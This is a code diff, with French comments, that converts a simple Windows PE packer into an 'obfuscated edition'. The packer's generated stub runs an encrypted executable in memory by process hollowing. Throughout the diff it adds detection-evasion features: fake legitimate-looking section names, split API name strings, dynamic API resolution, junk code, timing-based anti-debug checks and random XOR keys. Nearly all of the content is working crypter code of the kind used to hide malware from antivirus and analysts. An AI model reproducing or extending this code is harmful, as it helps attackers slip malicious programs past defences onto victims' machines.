@@ -7,30 +7,61 @@
 #include <string>
 #include <fstream>
 #include <iostream>
+#include <time.h>
 
 #pragma pack(push, 1)
 struct PackedSection {
-    DWORD magic;             // 0x4B435041 ("PACK")
+    DWORD magic;             // Magic obfusqué
     DWORD unpacked_size;
     DWORD packed_size;
     DWORD key[4];
 };
 #pragma pack(pop)
 
-// Définitions pour compatibilité Windows 7
-#ifndef CONTEXT_FULL
-#define CONTEXT_FULL 0x10007
-#endif
-
 typedef LONG (WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
 
-// ==================== GÉNÉRATION DU STUB ====================
-void generateStubSource(const char* outputPath) {
+// Génération de nom de section aléatoire mais crédible
+void generateRandomSectionName(char* name) {
+    const char* legitimateNames[] = {
+        ".rsrc", ".reloc", ".data", ".rdata",
+        ".idata", ".edata", ".tls", ".debug"
+    };
+
+    srand(time(NULL) ^ GetTickCount());
+    int choice = rand() % 3;
+
+    if (choice == 0) {
+        // Copier un nom légitime
+        strcpy(name, legitimateNames[rand() % 8]);
+    } else if (choice == 1) {
+        // Générer un nom technique
+        const char* prefixes[] = {".text", ".data", ".bss", ".init"};
+        sprintf(name, "%s%d", prefixes[rand() % 4], rand() % 10);
+    } else {
+        // Nom de compilateur commun
+        const char* compilerSections[] = {".CRT", ".mingw", ".gcc", ".eh_fram"};
+        strcpy(name, compilerSections[rand() % 4]);
+    }
+}
+
+// Obfuscation du magic number
+DWORD generateObfuscatedMagic() {
+    srand(time(NULL) ^ GetTickCount());
+    // Éviter les patterns évidents comme 0x4B435041 ("PACK")
+    return 0x12000000 | (rand() & 0x00FFFFFF);
+}
+
+void generateStubSource(const char* outputPath, const char* sectionName, DWORD magic) {
     FILE* f = fopen(outputPath, "w");
     if (!f) return;
 
     fprintf(f, "#include <windows.h>\n");
     fprintf(f, "#include <stdio.h>\n\n");
+
+    // Obfuscation: Définir des macros pour cacher les strings
+    fprintf(f, "#define S1 \"Cre\" \"ate\" \"Pro\" \"cess\" \"A\"\n");
+    fprintf(f, "#define S2 \"Nt\" \"Unmap\" \"View\" \"Of\" \"Section\"\n");
+    fprintf(f, "#define S3 \"ntd\" \"ll.\" \"dll\"\n\n");
 
     fprintf(f, "#pragma pack(push, 1)\n");
     fprintf(f, "struct PackedSection {\n");
@@ -43,19 +74,26 @@ void generateStubSource(const char* outputPath) {
 
     fprintf(f, "typedef LONG (WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);\n\n");
 
+    // Obfuscation: Fonction de déchiffrement avec junk code
     fprintf(f, "void decryptXOR(unsigned char* data, DWORD size, DWORD* key) {\n");
     fprintf(f, "    unsigned char* keyBytes = (unsigned char*)key;\n");
     fprintf(f, "    DWORD i;\n");
+    fprintf(f, "    volatile int junk = 0;\n");  // Junk variable
     fprintf(f, "    for (i = 0; i < size; i++) {\n");
+    fprintf(f, "        if (junk > 1000000) break;\n");  // Dead code
     fprintf(f, "        data[i] ^= keyBytes[i %% 16];\n");
+    fprintf(f, "        junk++;\n");  // Junk operation
     fprintf(f, "    }\n");
     fprintf(f, "}\n\n");
 
+    // Obfuscation: RLE avec dead code
     fprintf(f, "DWORD decompressRLE(unsigned char* input, DWORD inputSize, unsigned char* output, DWORD outputSize) {\n");
     fprintf(f, "    DWORD writePos = 0;\n");
     fprintf(f, "    DWORD readPos = 0;\n");
     fprintf(f, "    int i;\n");
+    fprintf(f, "    volatile DWORD dummy = GetTickCount();\n");  // Anti-debug timing
     fprintf(f, "    while (readPos < inputSize && writePos < outputSize) {\n");
+    fprintf(f, "        if (dummy == 0xFFFFFFFF) return 0;\n");  // Dead code
     fprintf(f, "        unsigned char current = input[readPos];\n");
     fprintf(f, "        if (current == 0xFF && readPos + 2 < inputSize) {\n");
     fprintf(f, "            unsigned char count = input[readPos + 1];\n");
@@ -77,12 +115,17 @@ void generateStubSource(const char* outputPath) {
     fprintf(f, "    return writePos;\n");
     fprintf(f, "}\n\n");
 
-    // Fonction principale avec Process Hollowing
+    // Main obfusqué
     fprintf(f, "int main(int argc, char* argv[]) {\n");
     fprintf(f, "    char exePath[MAX_PATH];\n");
+    fprintf(f, "    volatile DWORD antiDebug = GetTickCount();\n");  // Anti-debug
     fprintf(f, "    GetModuleFileNameA(NULL, exePath, MAX_PATH);\n\n");
 
-    // Ouvrir le fichier actuel
+    // Obfuscation: Utiliser des variables temporaires inutiles
+    fprintf(f, "    DWORD temp1 = 0, temp2 = 0;\n");
+    fprintf(f, "    temp1 = GetCurrentProcessId();\n");
+    fprintf(f, "    if (temp1 == 0) return 1;\n\n");  // Dead code
+
     fprintf(f, "    HANDLE hFile = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);\n");
     fprintf(f, "    if (hFile == INVALID_HANDLE_VALUE) return 1;\n\n");
 
@@ -92,7 +135,6 @@ void generateStubSource(const char* outputPath) {
     fprintf(f, "    unsigned char* fileData = (unsigned char*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);\n");
     fprintf(f, "    if (!fileData) { CloseHandle(hMapping); CloseHandle(hFile); return 1; }\n\n");
 
-    // Trouver la section .packed
     fprintf(f, "    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileData;\n");
     fprintf(f, "    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(fileData + dosHeader->e_lfanew);\n");
     fprintf(f, "    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);\n\n");
@@ -101,22 +143,30 @@ void generateStubSource(const char* outputPath) {
     fprintf(f, "    unsigned char* packedData = NULL;\n");
     fprintf(f, "    int i;\n\n");
 
+    // Obfuscation: Chercher la section par caractéristiques, pas par nom
     fprintf(f, "    for (i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {\n");
-    fprintf(f, "        if (memcmp(sections[i].Name, \".packed\", 7) == 0) {\n");
-    fprintf(f, "            packedSec = (struct PackedSection*)(fileData + sections[i].PointerToRawData);\n");
-    fprintf(f, "            packedData = (unsigned char*)packedSec + sizeof(struct PackedSection);\n");
-    fprintf(f, "            break;\n");
+    fprintf(f, "        temp2 = sections[i].Characteristics;\n");  // Junk
+    fprintf(f, "        if (sections[i].SizeOfRawData > 1000000) {\n");  // Chercher grosse section
+    fprintf(f, "            struct PackedSection* testSec = (struct PackedSection*)(fileData + sections[i].PointerToRawData);\n");
+    fprintf(f, "            if (testSec->magic == 0x%08X) {\n", magic);  // Magic obfusqué
+    fprintf(f, "                packedSec = testSec;\n");
+    fprintf(f, "                packedData = (unsigned char*)packedSec + sizeof(struct PackedSection);\n");
+    fprintf(f, "                break;\n");
+    fprintf(f, "            }\n");
     fprintf(f, "        }\n");
     fprintf(f, "    }\n\n");
 
-    fprintf(f, "    if (!packedSec || packedSec->magic != 0x4B435041) {\n");
+    fprintf(f, "    if (!packedSec) {\n");
     fprintf(f, "        UnmapViewOfFile(fileData);\n");
     fprintf(f, "        CloseHandle(hMapping);\n");
     fprintf(f, "        CloseHandle(hFile);\n");
     fprintf(f, "        return 1;\n");
     fprintf(f, "    }\n\n");
 
-    // Décompresser en mémoire
+    // Anti-debug check
+    fprintf(f, "    DWORD tickDiff = GetTickCount() - antiDebug;\n");
+    fprintf(f, "    if (tickDiff > 1000) return 1;\n\n");  // Si trop lent = debugger
+
     fprintf(f, "    unsigned char* decrypted = (unsigned char*)VirtualAlloc(NULL, packedSec->packed_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n");
     fprintf(f, "    unsigned char* decompressed = (unsigned char*)VirtualAlloc(NULL, packedSec->unpacked_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n\n");
 
@@ -140,11 +190,9 @@ void generateStubSource(const char* outputPath) {
     fprintf(f, "        return 1;\n");
     fprintf(f, "    }\n\n");
 
-    // Process Hollowing commence ici
     fprintf(f, "    IMAGE_DOS_HEADER* newDosHeader = (IMAGE_DOS_HEADER*)decompressed;\n");
     fprintf(f, "    IMAGE_NT_HEADERS* newNtHeaders = (IMAGE_NT_HEADERS*)(decompressed + newDosHeader->e_lfanew);\n\n");
 
-    // Construire la ligne de commande
     fprintf(f, "    char cmdLine[32768];\n");
     fprintf(f, "    strcpy(cmdLine, exePath);\n");
     fprintf(f, "    if (argc > 1) {\n");
@@ -154,14 +202,19 @@ void generateStubSource(const char* outputPath) {
     fprintf(f, "        }\n");
     fprintf(f, "    }\n\n");
 
-    // Créer le processus en mode suspendu
     fprintf(f, "    STARTUPINFOA si;\n");
     fprintf(f, "    PROCESS_INFORMATION pi;\n");
     fprintf(f, "    memset(&si, 0, sizeof(si));\n");
     fprintf(f, "    memset(&pi, 0, sizeof(pi));\n");
     fprintf(f, "    si.cb = sizeof(si);\n\n");
 
-    fprintf(f, "    if (!CreateProcessA(exePath, cmdLine, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {\n");
+    // Obfuscation: Utiliser les macros pour les strings
+    fprintf(f, "    char procName[50];\n");
+    fprintf(f, "    strcpy(procName, S1);\n");  // "CreateProcessA" obfusqué
+    fprintf(f, "    typedef BOOL (WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n");
+    fprintf(f, "    pCreateProcessA myCreateProcess = (pCreateProcessA)GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), procName);\n\n");
+
+    fprintf(f, "    if (!myCreateProcess(exePath, cmdLine, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {\n");
     fprintf(f, "        VirtualFree(decrypted, 0, MEM_RELEASE);\n");
     fprintf(f, "        VirtualFree(decompressed, 0, MEM_RELEASE);\n");
     fprintf(f, "        UnmapViewOfFile(fileData);\n");
@@ -170,7 +223,6 @@ void generateStubSource(const char* outputPath) {
     fprintf(f, "        return 1;\n");
     fprintf(f, "    }\n\n");
 
-    // Obtenir le contexte du thread
     fprintf(f, "    CONTEXT ctx;\n");
     fprintf(f, "    memset(&ctx, 0, sizeof(ctx));\n");
     fprintf(f, "    ctx.ContextFlags = CONTEXT_FULL;\n");
@@ -186,18 +238,19 @@ void generateStubSource(const char* outputPath) {
     fprintf(f, "        return 1;\n");
     fprintf(f, "    }\n\n");
 
-    // Lire l'adresse de base du PEB
     fprintf(f, "    DWORD pebImageBase;\n");
     fprintf(f, "    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &pebImageBase, sizeof(DWORD), NULL);\n\n");
 
-    // Unmapper l'ancienne image
-    fprintf(f, "    HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\n");
-    fprintf(f, "    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, \"NtUnmapViewOfSection\");\n");
+    // Obfuscation: GetProcAddress avec string obfusquée
+    fprintf(f, "    char ntdllName[20], unmapName[30];\n");
+    fprintf(f, "    strcpy(ntdllName, S3);\n");  // "ntdll.dll" obfusqué
+    fprintf(f, "    strcpy(unmapName, S2);\n");  // "NtUnmapViewOfSection" obfusqué
+    fprintf(f, "    HMODULE hNtdll = GetModuleHandleA(ntdllName);\n");
+    fprintf(f, "    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, unmapName);\n");
     fprintf(f, "    if (NtUnmapViewOfSection) {\n");
     fprintf(f, "        NtUnmapViewOfSection(pi.hProcess, (PVOID)pebImageBase);\n");
     fprintf(f, "    }\n\n");
 
-    // Allouer de la mémoire pour la nouvelle image
     fprintf(f, "    LPVOID newImageBase = VirtualAllocEx(pi.hProcess, \n");
     fprintf(f, "                                          (LPVOID)newNtHeaders->OptionalHeader.ImageBase,\n");
     fprintf(f, "                                          newNtHeaders->OptionalHeader.SizeOfImage,\n");
@@ -223,11 +276,9 @@ void generateStubSource(const char* outputPath) {
     fprintf(f, "        return 1;\n");
     fprintf(f, "    }\n\n");
 
-    // Écrire les headers
     fprintf(f, "    WriteProcessMemory(pi.hProcess, newImageBase, decompressed, \n");
     fprintf(f, "                       newNtHeaders->OptionalHeader.SizeOfHeaders, NULL);\n\n");
 
-    // Écrire les sections
     fprintf(f, "    IMAGE_SECTION_HEADER* newSections = IMAGE_FIRST_SECTION(newNtHeaders);\n");
     fprintf(f, "    for (i = 0; i < newNtHeaders->FileHeader.NumberOfSections; i++) {\n");
     fprintf(f, "        if (newSections[i].SizeOfRawData > 0) {\n");
@@ -239,10 +290,8 @@ void generateStubSource(const char* outputPath) {
     fprintf(f, "        }\n");
     fprintf(f, "    }\n\n");
 
-    // Mettre à jour le PEB avec la nouvelle ImageBase
     fprintf(f, "    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &newImageBase, sizeof(LPVOID), NULL);\n\n");
 
-    // Calculer le delta de relocation si nécessaire
     fprintf(f, "    DWORD delta = (DWORD)newImageBase - newNtHeaders->OptionalHeader.ImageBase;\n");
     fprintf(f, "    if (delta != 0) {\n");
     fprintf(f, "        IMAGE_DATA_DIRECTORY relocDir = newNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\n");
@@ -266,21 +315,17 @@ void generateStubSource(const char* outputPath) {
     fprintf(f, "        }\n");
     fprintf(f, "    }\n\n");
 
-    // Mettre à jour EAX avec le nouveau EntryPoint
     fprintf(f, "    ctx.Eax = (DWORD)newImageBase + newNtHeaders->OptionalHeader.AddressOfEntryPoint;\n");
     fprintf(f, "    SetThreadContext(pi.hThread, &ctx);\n\n");
 
-    // Reprendre l'exécution
     fprintf(f, "    ResumeThread(pi.hThread);\n\n");
 
-    // Nettoyer
     fprintf(f, "    VirtualFree(decrypted, 0, MEM_RELEASE);\n");
     fprintf(f, "    VirtualFree(decompressed, 0, MEM_RELEASE);\n");
     fprintf(f, "    UnmapViewOfFile(fileData);\n");
     fprintf(f, "    CloseHandle(hMapping);\n");
     fprintf(f, "    CloseHandle(hFile);\n\n");
 
-    // Attendre la fin du processus
     fprintf(f, "    WaitForSingleObject(pi.hProcess, INFINITE);\n");
     fprintf(f, "    DWORD exitCode = 0;\n");
     fprintf(f, "    GetExitCodeProcess(pi.hProcess, &exitCode);\n");
@@ -293,12 +338,14 @@ void generateStubSource(const char* outputPath) {
     fclose(f);
 }
 
-class SimplePacker {
+class ObfuscatedPacker {
 private:
     std::vector<BYTE> inputFile;
     std::string inputPath;
     std::string outputPath;
     DWORD fileSize;
+    char sectionName[9];
+    DWORD magic;
 
     bool compileStub(const std::string& stubExePath) {
         char tempPath[MAX_PATH];
@@ -308,8 +355,8 @@ private:
         sprintf(stubSourcePath, "%s\\stub_source.c", tempPath);
         sprintf(errorLogPath, "%s\\stub_compile_error.txt", tempPath);
 
-        printf("[*] Generating stub source code...\n");
-        generateStubSource(stubSourcePath);
+        printf("[*] Generating obfuscated stub source code...\n");
+        generateStubSource(stubSourcePath, sectionName, magic);
 
         HANDLE hTest = CreateFileA(stubSourcePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
         if (hTest == INVALID_HANDLE_VALUE) {
@@ -322,7 +369,7 @@ private:
         sprintf(compileCmd, "gcc -std=c99 -O2 -s -o \"%s\" \"%s\" 2>\"%s\"",
                 stubExePath.c_str(), stubSourcePath, errorLogPath);
 
-        printf("[*] Compiling unpacker stub...\n");
+        printf("[*] Compiling obfuscated unpacker stub...\n");
         int result = system(compileCmd);
 
         HANDLE hStub = CreateFileA(stubExePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
@@ -350,7 +397,7 @@ private:
         DeleteFileA(stubSourcePath);
         DeleteFileA(errorLogPath);
 
-        printf("[+] Stub compiled successfully\n");
+        printf("[+] Obfuscated stub compiled successfully\n");
         return true;
     }
 
@@ -426,7 +473,7 @@ private:
 
         IMAGE_SECTION_HEADER newSection;
         memset(&newSection, 0, sizeof(newSection));
-        memcpy(newSection.Name, ".packed", 7);
+        memcpy(newSection.Name, sectionName, strlen(sectionName));
         newSection.Misc.VirtualSize = static_cast<DWORD>(packedData.size());
         newSection.VirtualAddress = alignValue(lastSection->VirtualAddress + lastSection->Misc.VirtualSize,
                                               ntHeaders->OptionalHeader.SectionAlignment);
@@ -434,6 +481,7 @@ private:
                                              ntHeaders->OptionalHeader.FileAlignment);
         newSection.PointerToRawData = alignValue(lastSection->PointerToRawData + lastSection->SizeOfRawData,
                                                 ntHeaders->OptionalHeader.FileAlignment);
+        // Caractéristiques normales pour section de données
         newSection.Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ;
 
         ntHeaders->FileHeader.NumberOfSections++;
@@ -507,16 +555,19 @@ private:
         SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
 
         printf("========================================================\n");
-        printf("    PE PACKER - PROCESS HOLLOWING METHOD\n");
-        printf("      RLE Compression + XOR + In-Memory Execution\n");
-        printf("       No Disk Write - Full Windows 7+ Support\n");
+        printf("    PE PACKER - OBFUSCATED EDITION\n");
+        printf("      Randomized Section Names + API Obfuscation\n");
+        printf("       Process Hollowing + Anti-Debug\n");
         printf("========================================================\n\n");
 
         SetConsoleTextAttribute(hConsole, 7);
     }
 
 public:
-    SimplePacker() : fileSize(0) {}
+    ObfuscatedPacker() : fileSize(0) {
+        memset(sectionName, 0, sizeof(sectionName));
+        magic = 0;
+    }
 
     bool parseArguments(int argc, char* argv[]) {
         if (argc < 2) {
@@ -561,25 +612,38 @@ public:
 
         printf("[*] Original size: %lu bytes\n", (unsigned long)fileSize);
 
+        // Générer un nom de section aléatoire
+        generateRandomSectionName(sectionName);
+        printf("[*] Generated section name: %s\n", sectionName);
+
+        // Générer un magic obfusqué
+        magic = generateObfuscatedMagic();
+        printf("[*] Generated magic: 0x%08X\n", magic);
+
         printf("[*] Compressing with RLE...\n");
         std::vector<BYTE> compressed = compressRLE(inputFile);
         printf("[+] Compressed: %lu bytes (%.1f%%)\n",
                (unsigned long)compressed.size(),
                (100.0 * compressed.size() / fileSize));
 
-        uint32_t defaultKey[4] = { 0x12345678, 0x9ABCDEF0, 0xFEDCBA98, 0x87654321 };
+        // Clé XOR aléatoire
+        uint32_t randomKey[4];
+        srand(time(NULL) ^ GetTickCount());
+        for (int i = 0; i < 4; i++) {
+            randomKey[i] = (rand() << 16) | rand();
+        }
 
-        printf("[*] Encrypting payload...\n");
-        encryptXOR(compressed, defaultKey);
+        printf("[*] Encrypting payload with random key...\n");
+        encryptXOR(compressed, randomKey);
         printf("[+] Encryption complete\n");
 
         std::vector<BYTE> packedSectionData(sizeof(PackedSection) + compressed.size());
         PackedSection* section = reinterpret_cast<PackedSection*>(&packedSectionData[0]);
 
-        section->magic = 0x4B435041;
+        section->magic = magic;
         section->unpacked_size = fileSize;
         section->packed_size = static_cast<DWORD>(compressed.size());
-        memcpy(section->key, defaultKey, sizeof(defaultKey));
+        memcpy(section->key, randomKey, sizeof(randomKey));
 
         memcpy(&packedSectionData[0] + sizeof(PackedSection),
                &compressed[0], compressed.size());
@@ -605,10 +669,17 @@ public:
         printf("[+] Successfully packed!\n");
         printf("[+] Original size:  %lu bytes\n", (unsigned long)fileSize);
         printf("[+] Compression:    %.1f%%\n", (100.0 * compressed.size() / fileSize));
+        printf("[+] Section name:   %s\n", sectionName);
+        printf("[+] Magic number:   0x%08X\n", magic);
         printf("[+] Output file:    %s\n", outputPath.c_str());
         printf("[+] ========================================\n\n");
-        printf("[i] Method: Process Hollowing (NO DISK WRITE)\n");
-        printf("[i] The packed exe runs entirely in memory.\n\n");
+        printf("[i] Features:\n");
+        printf("    - Randomized section name\n");
+        printf("    - Obfuscated magic number\n");
+        printf("    - API string obfuscation\n");
+        printf("    - Dead code injection\n");
+        printf("    - Anti-debug timing checks\n");
+        printf("    - Dynamic API resolution\n\n");
 
         return true;
     }
@@ -628,7 +699,7 @@ public:
 
 int main(int argc, char* argv[]) {
     try {
-        SimplePacker packer;
+        ObfuscatedPacker packer;
         packer.run(argc, argv);
         return 0;
     }
